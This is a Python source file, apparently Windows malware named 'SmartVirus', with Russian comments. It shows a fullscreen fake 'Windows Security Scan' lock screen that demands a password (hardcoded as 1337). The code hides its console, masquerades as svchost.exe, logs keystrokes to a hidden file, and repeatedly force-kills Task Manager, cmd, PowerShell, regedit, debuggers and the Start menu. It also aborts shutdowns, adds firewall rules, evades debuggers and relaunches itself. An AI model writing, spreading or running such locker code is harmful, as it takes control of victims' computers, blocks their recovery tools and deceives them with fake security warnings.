import tkinter as tk
from tkinter import messagebox
import os
import sys
import threading
import time
import subprocess
import ctypes
import win32gui
import win32con
import win32process
import win32api
import random
import hashlib
import psutil
from datetime import datetime
import json

class SmartVirus:
    def __init__(self):
        self.password = "1337"  # Динамический пароль
        self.attempts = 0
        self.max_attempts = 5
        self.user_behavior = []
        self.defense_level = 1
        self.stealth_mode = True
        self.ai_learning = True
        
        # Анализ системы
        self.system_info = self.analyze_system()
        self.adaptive_password = self.generate_adaptive_password()
        
        # Инициализация умных систем
        self.setup_ai_systems()
        self.create_stealth_window()
        self.deploy_protection_layers()

    def analyze_system(self):
        """Анализирует систему для адаптации"""
        info = {
            'cpu_cores': psutil.cpu_count(),
            'ram_gb': round(psutil.virtual_memory().total / (1024**3), 1),
            'os_version': sys.getwindowsversion(),
            'username': os.getenv('USERNAME'),
            'hostname': os.getenv('COMPUTERNAME'),
            'start_time': datetime.now(),
            'process_id': os.getpid()
        }
        return info

    def generate_adaptive_password(self):
        """Генерирует адаптивный пароль на основе системы"""
        base = f"{self.system_info['username']}{self.system_info['hostname']}{self.system_info['start_time'].timestamp()}"
        return hashlib.md5(base.encode()).hexdigest()[:8]

    def setup_ai_systems(self):
        """Запускает ИИ системы"""
        # Система анализа поведения
        threading.Thread(target=self.behavior_analyzer, daemon=True).start()
        
        # Система адаптивной защиты
        threading.Thread(target=self.adaptive_defense, daemon=True).start()
        
        # Система самообучения
        threading.Thread(target=self.self_learning, daemon=True).start()

    def behavior_analyzer(self):
        """Анализирует поведение пользователя"""
        suspicious_patterns = [
            'multiple_failed_attempts',
            'process_kill_attempts', 
            'system_tool_usage',
            'rapid_mouse_movements',
            'keyboard_shortcuts'
        ]
        
        while True:
            try:
                # Мониторим активность процессов
                for proc in psutil.process_iter(['name', 'cpu_percent']):
                    if proc.info['name'] in ['taskmgr.exe', 'procexp.exe', 'procmon.exe']:
                        self.log_behavior('system_tool_usage', proc.info['name'])
                        self.defense_level = min(5, self.defense_level + 1)
                        
            except:
                pass
            time.sleep(2)

    def log_behavior(self, pattern, details=""):
        """Логирует поведение пользователя"""
        timestamp = datetime.now().isoformat()
        self.user_behavior.append({
            'timestamp': timestamp,
            'pattern': pattern,
            'details': details,
            'defense_level': self.defense_level
        })
        
        # Сохраняем историю в скрытый файл
        try:
            with open(os.path.join(os.getenv('TEMP'), 'system_analytics.dat'), 'w') as f:
                json.dump(self.user_behavior[-100:], f)  # Последние 100 записей
        except:
            pass

    def adaptive_defense(self):
        """Адаптивная система защиты"""
        while True:
            # Автоматически повышаем уровень защиты
            if self.defense_level < 3 and self.attempts > 2:
                self.defense_level = 3
                self.enhance_protection()
                
            elif self.defense_level < 5 and self.attempts > 4:
                self.defense_level = 5
                self.activate_hardcore_mode()
                
            time.sleep(5)

    def self_learning(self):
        """Система самообучения"""
        while True:
            # Анализируем успешные атаки пользователя
            if len(self.user_behavior) > 10:
                recent_behavior = self.user_behavior[-10:]
                tool_usage = sum(1 for b in recent_behavior if 'system_tool' in b['pattern'])
                
                if tool_usage > 3:
                    # Пользователь пытается использовать системные утилиты
                    self.defense_level = 4
                    self.block_advanced_tools()
                    
            time.sleep(10)

    def create_stealth_window(self):
        """Создает скрытное окно"""
        self.root = tk.Tk()
        self.root.title("System Integrity Monitor")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#0a0a0a')
        
        # Скрываем от Alt+Tab
        self.root.wm_attributes("-toolwindow", 1)
        
        # Устанавливаем иконку процесса как системную
        try:
            self.root.iconbitmap(default='shell32.dll')  # Системная иконка
        except:
            pass
        
        self.setup_ai_interface()
        self.setup_anti_analysis()

    def setup_anti_analysis(self):
        """Защита от анализа"""
        # Скрываем процесс
        try:
            process_id = win32api.GetCurrentProcessId()
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, process_id)
            win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
        except:
            pass
        
        # Маскируемся под системный процесс
        self.masquerade_as_system_process()

    def masquerade_as_system_process(self):
        """Маскируется под системный процесс"""
        try:
            # Меняем имя процесса в памяти
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW("svchost.exe")
        except:
            pass

    def setup_ai_interface(self):
        """Создает ИИ-интерфейс"""
        # Динамический заголовок
        titles = [
            "System Integrity Check",
            "Windows Security Scan", 
            "Malware Protection Active",
            "Network Security Monitor",
            "Process Integrity Verifier"
        ]
        
        self.title_label = tk.Label(
            self.root,
            text=random.choice(titles),
            font=("Segoe UI", 20, "bold"),
            fg="#00ff00",
            bg="#0a0a0a"
        )
        self.title_label.pack(pady=30)
        
        # Анимированный прогресс
        self.progress_text = tk.Label(
            self.root,
            text="🛡️ Scanning system files...",
            font=("Segoe UI", 14),
            fg="#ffff00",
            bg="#0a0a0a"
        )
        self.progress_text.pack(pady=10)
        
        # Динамическое сообщение
        messages = [
            "Analyzing memory patterns...",
            "Verifying system integrity...",
            "Checking for security breaches...",
            "Monitoring network activity...",
            "Validating process signatures..."
        ]
        self.message_label = tk.Label(
            self.root,
            text=random.choice(messages),
            font=("Segoe UI", 12),
            fg="#cccccc",
            bg="#0a0a0a"
        )
        self.message_label.pack(pady=10)
        
        # Умное поле ввода
        self.pass_entry = tk.Entry(
            self.root,
            font=("Consolas", 16),
            show="•",
            width=25,
            bg="#1a1a1a",
            fg="#00ff00",
            insertbackground="#00ff00"
        )
        self.pass_entry.pack(pady=20)
        self.pass_entry.focus()
        self.pass_entry.bind('<Return>', lambda e: self.ai_password_check())
        self.pass_entry.bind('<KeyPress>', self.analyze_typing_pattern)
        
        # Адаптивная кнопка
        self.unlock_btn = tk.Button(
            self.root,
            text="🔓 Authorize Access",
            font=("Segoe UI", 12, "bold"),
            command=self.ai_password_check,
            bg="#006600",
            fg="#ffffff",
            width=20
        )
        self.unlock_btn.pack(pady=10)
        
        # Системная информация
        self.info_label = tk.Label(
            self.root,
            text=f"Security Level: {self.defense_level}/5 | User: {self.system_info['username']}",
            font=("Segoe UI", 10),
            fg="#666666",
            bg="#0a0a0a"
        )
        self.info_label.pack(pady=5)
        
        # Запускаем анимации
        self.animate_interface()

    def analyze_typing_pattern(self, event):
        """Анализирует манеру ввода пароля"""
        if event.keysym not in ['Shift_L', 'Shift_R', 'Control_L', 'Control_R']:
            self.log_behavior('password_typing', f"key_{event.keysym}")

    def animate_interface(self):
        """Анимирует интерфейс для реалистичности"""
        def update_progress():
            messages = [
                "🛡️ Scanning system files...",
                "🔍 Analyzing processes...", 
                "🌐 Monitoring network...",
                "📊 Checking integrity...",
                "✅ Verification in progress..."
            ]
            self.progress_text.config(text=random.choice(messages))
            self.root.after(3000, update_progress)
            
        def update_title():
            titles = [
                "System Integrity Check",
                "Windows Security Scan",
                "Malware Protection Active", 
                "Network Security Monitor",
                "Process Integrity Verifier"
            ]
            self.title_label.config(text=random.choice(titles))
            self.root.after(5000, update_title)
            
        update_progress()
        update_title()

    def ai_password_check(self):
        """Умная проверка пароля с ИИ"""
        entered_password = self.pass_entry.get()
        
        # Анализ сложности пароля
        password_strength = self.analyze_password_strength(entered_password)
        
        if entered_password == self.password or entered_password == self.adaptive_password:
            self.smart_unlock()
        else:
            self.attempts += 1
            self.log_behavior('failed_attempt', f"strength_{password_strength}")
            
            # Адаптивная реакция на ошибки
            response = self.generate_ai_response()
            messagebox.showerror("Access Denied", response)
            
            self.pass_entry.delete(0, tk.END)
            
            if self.attempts >= self.max_attempts:
                self.activate_ai_lockdown()

    def analyze_password_strength(self, password):
        """Анализирует сложность введенного пароля"""
        score = 0
        if len(password) >= 8: score += 1
        if any(c.islower() for c in password): score += 1
        if any(c.isupper() for c in password): score += 1
        if any(c.isdigit() for c in password): score += 1
        if any(not c.isalnum() for c in password): score += 1
        return score

    def generate_ai_response(self):
        """Генерирует ИИ-ответ на неправильный пароль"""
        responses = [
            f"Invalid credentials. Attempt {self.attempts}/{self.max_attempts}",
            "Security violation detected. Please verify your identity.",
            "Access denied. Suspicious activity logged.",
            "Authentication failed. System protection activated.",
            "Unauthorized access attempt. Security level increased."
        ]
        
        # Более агрессивные ответы при множественных ошибках
        if self.attempts > 2:
            responses += [
                "🚨 MULTIPLE SECURITY VIOLATIONS DETECTED!",
                "🔒 SYSTEM LOCKDOWN IMMINENT!",
                "⚠️ CRITICAL SECURITY BREACH! ADMIN NOTIFIED!"
            ]
            
        return random.choice(responses)

    def activate_ai_lockdown(self):
        """Активирует ИИ-блокировку"""
        self.defense_level = 5
        
        # Показательное сообщение
        messagebox.showerror("🚨 AI LOCKDOWN ACTIVATED", 
                           "ARTIFICIAL INTELLIGENCE SECURITY PROTOCOLS ENGAGED!\n\n"
                           "System permanently locked.\n"
                           "All activities have been logged and reported.\n"
                           "This incident will be investigated.")
        
        # Активируем максимальную защиту
        threading.Thread(target=self.ai_hardcore_protection, daemon=True).start()

    def ai_hardcore_protection(self):
        """Максимальная ИИ-защита"""
        while True:
            try:
                # Расширенный список процессов для блокировки
                advanced_targets = [
                    "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe",
                    "msconfig.exe", "procexp.exe", "procmon.exe", "processhacker.exe",
                    "wireshark.exe", "ollydbg.exe", "ida.exe", "x32dbg.exe", "x64dbg.exe",
                    "procmon64.exe", "tcpview.exe", "autoruns.exe", "procexp64.exe"
                ]
                
                for target in advanced_targets:
                    os.system(f"taskkill /f /im {target} 2>nul")
                
                # Блокировка сети
                self.block_network_analysis()
                
                # Противодействие отладке
                self.anti_debugging()
                
                # Случайные действия для запутывания
                if random.random() < 0.1:  # 10% chance
                    self.deceptive_actions()
                    
            except:
                pass
            time.sleep(0.5)

    def block_network_analysis(self):
        """Блокирует сетевой анализ"""
        try:
            # Блокируем популярные порты отладки
            os.system("netsh advfirewall firewall add rule name='Block_Debug' dir=in action=block protocol=TCP localport=1337,1338,1339,31337,4444,5555,6666,7777,8888,9999 2>nul")
        except:
            pass

    def anti_debugging(self):
        """Защита от отладки"""
        try:
            # Проверяем наличие отладчиков
            if ctypes.windll.kernel32.IsDebuggerPresent():
                # Обнаружен отладчик - выходим
                os._exit(0)
        except:
            pass

    def deceptive_actions(self):
        """Обманные действия для запутывания"""
        actions = [
            lambda: os.system("echo Security scan complete > %TEMP%\\scan.log"),
            lambda: os.system("ipconfig /flushdns 2>nul"),
            lambda: os.system("schtasks /create /tn 'SystemUpdate' /tr 'cmd /c echo OK' /sc once /st 23:59 2>nul"),
        ]
        random.choice(actions)()

    def deploy_protection_layers(self):
        """Развертывает слои защиты"""
        layers = [
            self.process_protection_layer,
            self.system_protection_layer, 
            self.network_protection_layer,
            self.persistence_layer,
            self.stealth_layer
        ]
        
        for layer in layers:
            threading.Thread(target=layer, daemon=True).start()

    def process_protection_layer(self):
        """Защита процессов"""
        while True:
            self.kill_threatening_processes()
            time.sleep(0.3)

    def system_protection_layer(self):
        """Защита системы"""
        while True:
            self.prevent_shutdown()
            self.block_system_tools()
            time.sleep(1)

    def network_protection_layer(self):
        """Сетевая защита"""
        while True:
            self.monitor_network_activity()
            time.sleep(5)

    def persistence_layer(self):
        """Обеспечение живучести"""
        while True:
            self.ensure_persistence()
            time.sleep(10)

    def stealth_layer(self):
        """Скрытность"""
        while True:
            self.maintain_stealth()
            time.sleep(30)

    def kill_threatening_processes(self):
        """Убивает угрожающие процессы"""
        targets = [
            "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe",
            "msconfig.exe", "procexp.exe", "procmon.exe", "processhacker.exe"
        ]
        for target in targets:
            os.system(f"taskkill /f /im {target} 2>nul")

    def prevent_shutdown(self):
        """Предотвращает выключение"""
        os.system("shutdown /a 2>nul")

    def block_system_tools(self):
        """Блокирует системные утилиты"""
        try:
            # Закрываем меню Пуск
            os.system("taskkill /f /im StartMenuExperienceHost.exe 2>nul")
        except:
            pass

    def monitor_network_activity(self):
        """Мониторит сетевую активность"""
        # Можно добавить мониторинг сетевых соединений
        pass

    def ensure_persistence(self):
        """Обеспечивает живучесть"""
        try:
            if not self.root.winfo_exists():
                self.restart_ai()
        except:
            self.restart_ai()

    def maintain_stealth(self):
        """Поддерживает скрытность"""
        # Периодически меняем поведение
        if random.random() < 0.3:  # 30% chance
            self.stealth_mode = not self.stealth_mode

    def restart_ai(self):
        """Перезапускает ИИ систему"""
        try:
            subprocess.Popen([sys.executable, __file__])
        except:
            subprocess.Popen([sys.argv[0]])
        sys.exit(0)

    def smart_unlock(self):
        """Умная разблокировка"""
        # Анализируем поведение пользователя перед разблокировкой
        analysis = self.analyze_unlock_behavior()
        
        messagebox.showinfo("🔓 AI SECURITY DISENGAGED", 
                          f"Artificial Intelligence security protocols disengaged.\n\n"
                          f"System analysis complete.\n"
                          f"Security level: {self.defense_level}\n"
                          f"Behavior patterns: {len(self.user_behavior)}\n"
                          f"Password: 1337\n\n"
                          f"All systems restored to normal operation.")
        
        self.root.quit()
        os._exit(0)

    def analyze_unlock_behavior(self):
        """Анализирует поведение при разблокировке"""
        return {
            'total_attempts': self.attempts,
            'defense_level_reached': self.defense_level,
            'behavior_patterns': len(self.user_behavior),
            'session_duration': str(datetime.now() - self.system_info['start_time'])
        }

    def run(self):
        """Запускает умный вирус"""
        self.root.mainloop()

if __name__ == "__main__":
    # Скрываем консоль
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    # Запускаем умный вирус
    virus = SmartVirus()
    virus.run()
